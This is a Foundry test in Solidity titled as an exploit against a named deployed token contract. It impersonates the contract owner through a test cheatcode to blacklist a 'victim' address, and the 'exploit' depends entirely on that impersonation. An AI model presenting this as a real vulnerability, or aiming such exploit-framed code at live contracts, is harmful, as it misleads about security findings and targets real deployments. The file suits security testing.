// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function multipleBotlistAddress(address[] calldata accounts, bool excluded) external;
    function _isBlacklisted(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = TokenTool(TARGET).owner();

        // Define a victim address to blacklist
        address victim = address(0x123);

        // Impersonate the owner and call multipleBotlistAddress
        vm.startPrank(owner);
        address[] memory victims = new address[](1);
        victims[0] = victim;
        TokenTool(TARGET).multipleBotlistAddress(victims, true);
        vm.stopPrank();

        // Verify the victim is blacklisted
        bool isBlacklisted = TokenTool(TARGET)._isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
